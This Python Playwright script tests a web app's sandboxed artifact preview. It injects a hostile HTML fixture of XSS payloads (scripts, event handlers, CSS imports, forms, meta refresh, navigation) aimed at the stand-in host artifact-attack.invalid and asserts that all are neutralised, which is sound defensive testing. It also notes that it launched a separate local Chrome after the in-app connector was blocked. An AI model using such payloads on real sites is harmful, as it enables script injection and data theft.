"""Fresh isolated Chrome test context; in-app connector bootstrap was blocked."""
import json,time
from pathlib import Path
from datetime import datetime,timezone
import httpx
from playwright.sync_api import sync_playwright
from backend.app.artifacts import preview
ROOT=Path('docs/agent-transcripts/phase-07')
SCREEN=Path('.cache/phase7-browser');SCREEN.mkdir(parents=True,exist_ok=True)
SID='847f1c72-8ede-4343-8c7b-abde465d794d';MID='c8cfdb63-40b8-59ab-b887-0490d30f8f42'
def main():
 with httpx.Client(base_url='http://127.0.0.1:8080',trust_env=False,timeout=20) as c:
  artifacts=[]
  for kind in ['markdown','html']:
   r=c.post(f'/api/sessions/{SID}/artifacts',json={'message_id':MID,'format':kind});r.raise_for_status();a=r.json();assert a['source_metadata']['provenance']=='reviewed_fixture';artifacts.append(a)
  r=c.get('/api/sessions');r.raise_for_status();title=next(s['title'] for s in r.json() if s['id']==SID)
 with sync_playwright() as pw:
  browser=pw.chromium.launch(executable_path='/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',headless=True)
  context=browser.new_context(viewport={'width':1512,'height':1050});page=context.new_page();errors=[];dialogs=[];network=[];console=[]
  page.on('console',lambda m:console.append({'type':m.type,'text':m.text}));page.on('pageerror',lambda e:errors.append(str(e)));page.on('dialog',lambda d:(dialogs.append(d.type),d.dismiss()));page.on('request',lambda q:network.append(q.url))
  page.goto('http://127.0.0.1:8080');page.get_by_role('button',name=title,exact=False).click()
  page.get_by_text('Reviewed essay fixture · rendering check only',exact=True).wait_for()
  previews=[]
  for a in artifacts:
   page.get_by_role('button',name=a['type']+' · '+a['title'][:32],exact=True).click()
   frame=page.frame_locator('iframe[title="'+a['type']+' artifact preview"]')
   frame.get_by_role('heading',name='Before You Rewrite Onboarding, Find the Benefit Users Would Miss',exact=True).wait_for()
   assert frame.locator('h2').count()==6
   assert frame.locator('strong').count()>=1
   assert '[S2]' in frame.locator('body').inner_text()
   assert page.locator('iframe').get_attribute('sandbox')==''
   previews.append({'type':a['type'],'artifact_id':a['id'],'headings':6,'literal_citation_present':True,'sandbox_empty':True})
  page.get_by_role('button',name='S2 · View source',exact=True).last.click()
  page.get_by_role('heading',name='Stored original passage',exact=True).wait_for()
  assert 'Lookout' in page.locator('.source-inspector pre').inner_text()
  page.get_by_text('Available',exact=True).first.wait_for()
  page.screenshot(path=str(SCREEN/'fixture-viewer.png'),full_page=True)
  parent_color=page.locator('.brand').evaluate('(e)=>getComputedStyle(e).color')
  payload='''<script>parent.__artifactPwned=true;fetch('https://artifact-attack.invalid/script');alert('bad');top.location='https://artifact-attack.invalid/nav'</script><style>@import 'https://artifact-attack.invalid/css';.brand{color:red!important}body{position:fixed;inset:0}</style><img src="https://artifact-attack.invalid/image" onerror="parent.__artifactPwned=true"><svg onload="alert('svg')"><image href="https://artifact-attack.invalid/svg"/></svg><form action="https://artifact-attack.invalid/form"><input autofocus onfocus="alert('focus')"><button>Submit</button></form><iframe src="https://artifact-attack.invalid/frame"></iframe><a href="https://artifact-attack.invalid/link" target="_top">Navigate</a><meta http-equiv="refresh" content="0;url=https://artifact-attack.invalid/refresh"><div style="background-image:url(https://artifact-attack.invalid/background);position:fixed;color:red">Hostile fixture safe text</div><math><mtext><img src=x onerror=alert(1)></mtext></math>'''
  hostile={'id':'security-fixture','title':'Hostile fixture','type':'html','preview_html':preview(payload,'html','Hostile fixture'),'source_metadata':{'provenance':'reviewed_fixture','citation_ids':[]}}
  page.route(f'**/api/sessions/{SID}/artifacts',lambda route:route.fulfill(json=[hostile]))
  page.reload();page.get_by_role('button',name=title,exact=False).click();frame=page.frame_locator('iframe[title="html artifact preview"]');frame.get_by_text('Hostile fixture safe text',exact=True).wait_for()
  page.wait_for_timeout(500)
  assert not [u for u in network if 'artifact-attack.invalid' in u]
  assert not dialogs
  assert len(context.pages)==1
  assert page.url=='http://127.0.0.1:8080/'
  assert page.locator('.brand').evaluate('(e)=>getComputedStyle(e).color')==parent_color
  assert not page.evaluate('Boolean(window.__artifactPwned)')
  assert frame.locator('script,form,iframe,img,svg,math,a,meta[http-equiv="refresh"]').count()==0
  report={'captured_at':datetime.now(timezone.utc).isoformat(),'browser':'fresh isolated headless Chrome '+browser.version,'fixture_provenance':'reviewed prior essay only; no generation in this test','artifact_checks':previews,'citation_source_opened':'S2; actual Lookout passage displayed','hostile_html':{'script_not_executed':True,'parent_not_modified':True,'parent_css_unchanged':True,'external_requests':[],'dialogs':dialogs,'popups':0,'navigation_unchanged':True,'forms_frames_svg_links_removed':True},'page_errors':errors,'console':console,'in_app_connector':'bootstrap blocked: node:process import forbidden; local browser evidence is separate','limitations':'One Chrome version; script-free subset only; no claim of universal sanitization or UI accessibility acceptance.'}
  (ROOT/'browser-fixture.json').write_text(json.dumps(report,indent=2)+'\n');browser.close();print(json.dumps(report))
if __name__=='__main__':main()
